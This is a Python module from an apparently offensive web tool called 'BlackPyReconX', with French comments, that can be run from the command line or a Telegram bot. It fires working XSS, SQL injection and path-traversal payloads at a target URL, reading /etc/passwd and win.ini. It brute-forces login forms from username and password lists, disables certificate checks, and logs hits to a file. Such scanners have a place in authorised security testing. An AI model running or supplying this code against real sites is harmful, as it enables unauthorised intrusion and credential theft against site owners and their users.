import os
import sys
import requests
from urllib.parse import urljoin
from pathlib import Path
from datetime import datetime
import urllib3

# ✅ Import dynamique
current_dir = os.path.dirname(os.path.abspath(__file__))
project_root = os.path.abspath(os.path.join(current_dir, ".."))
if project_root not in sys.path:
    sys.path.insert(0, project_root)

from modules.utils import is_valid_ip

# 🔇 Désactiver les avertissements SSL (sites vulnérables)
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# 📂 Fichier de sortie
OUTPUT_FILE = Path(project_root) / "outputs" / "web_vulns.txt"

# 🧠 User-Agent
HEADERS = {"User-Agent": "BlackPyReconX Scanner"}

def detect_xss(url):
    payload = "<script>alert(1)</script>"
    test_url = f"{url}?q={payload}"
    try:
        r = requests.get(test_url, headers=HEADERS, timeout=5, verify=False)
        if payload in r.text:
            return f"[XSS] {test_url}"
    except Exception as e:
        print(f"❌ Erreur XSS : {e}")
    return None

def detect_sqli(url):
    payloads = ["'", "' OR '1'='1", "'--", "' OR 1=1 --", "';--"]
    vulns = []
    for p in payloads:
        test_url = f"{url}?id={p}"
        try:
            r = requests.get(test_url, headers=HEADERS, timeout=5, verify=False)
            if any(keyword in r.text.lower() for keyword in ["sql", "mysql", "syntax", "error", "odbc"]):
                vulns.append(f"[SQLi] {test_url}")
        except Exception as e:
            print(f"❌ Erreur SQLi : {e}")
    return vulns

def detect_lfi(url):
    paths = ["../../../../etc/passwd", "..\\..\\..\\..\\windows\\win.ini"]
    for p in paths:
        test_url = f"{url}?file={p}"
        try:
            r = requests.get(test_url, headers=HEADERS, timeout=5, verify=False)
            if "root:" in r.text or "[extensions]" in r.text:
                return f"[LFI] {test_url}"
        except Exception as e:
            print(f"❌ Erreur LFI : {e}")
    return None

def brute_force_login(url, users, passwords):
    found = []
    for u in users:
        for p in passwords:
            try:
                data = {"username": u, "password": p}
                r = requests.post(url, data=data, headers=HEADERS, timeout=5, verify=False)
                if "Welcome" in r.text or r.status_code == 302:
                    found.append(f"[Bruteforce] {u}:{p} => {url}")
            except Exception as e:
                print(f"❌ Erreur bruteforce {u}:{p} : {e}")
    return found

def check_headers(url):
    issues = []
    try:
        r = requests.get(url, headers=HEADERS, timeout=5, verify=False)
        headers = r.headers
        if "X-Frame-Options" not in headers:
            issues.append("[Headers] X-Frame-Options manquant")
        if "Content-Security-Policy" not in headers:
            issues.append("[Headers] Content-Security-Policy manquant")
        return issues
    except Exception as e:
        print(f"❌ Erreur headers : {e}")
        return []

def format_vulns(url, vulns):
    lines = [f"🔍 Vulnérabilités détectées sur {url}", f"🕒 Date : {datetime.now()}", "-" * 40]
    if not vulns:
        lines.append("[✔] Aucune vulnérabilité détectée.")
    else:
        lines.extend(vulns)
    return "\n".join(lines)

def save_results(formatted_text):
    try:
        OUTPUT_FILE.parent.mkdir(parents=True, exist_ok=True)
        with open(OUTPUT_FILE, "a", encoding="utf-8") as f:
            f.write(f"\n\n{formatted_text}\n")
        print(f"✅ Résultats enregistrés dans {OUTPUT_FILE}")
    except Exception as e:
        print(f"❌ Erreur de sauvegarde : {e}")

def exploit_system(target_url):
    print(f"[•] Analyse de vulnérabilités web : {target_url}")
    vulns = []

    # Détections
    xss = detect_xss(target_url)
    if xss: vulns.append(xss)

    sqli = detect_sqli(target_url)
    if sqli: vulns.extend(sqli)

    lfi = detect_lfi(target_url)
    if lfi: vulns.append(lfi)

    headers = check_headers(target_url)
    vulns.extend(headers)

    # Bruteforce si fichiers présents
    user_file = Path(project_root) / "data" / "users.txt"
    pass_file = Path(project_root) / "data" / "passwords.txt"
    if user_file.exists() and pass_file.exists():
        try:
            with open(user_file, encoding="utf-8") as uf, open(pass_file, encoding="utf-8") as pf:
                users = [u.strip() for u in uf if u.strip()]
                passwords = [p.strip() for p in pf if p.strip()]
                found = brute_force_login(target_url, users, passwords)
                vulns.extend(found)
        except Exception as e:
            print(f"❌ Erreur lecture bruteforce : {e}")

    formatted = format_vulns(target_url, vulns)
    print(formatted)
    save_results(formatted)
    return vulns

# ✅ Fonction utilisée par main.py et bot Telegram
def run(url):
    return exploit_system(url)

# 🔁 Test CLI local
if __name__ == "__main__":
    import argparse
    parser = argparse.ArgumentParser(description="Exploit web system module - BlackPyReconX")
    parser.add_argument("url", help="URL cible (ex: http://site.com/page)")
    args = parser.parse_args()
    exploit_system(args.url)
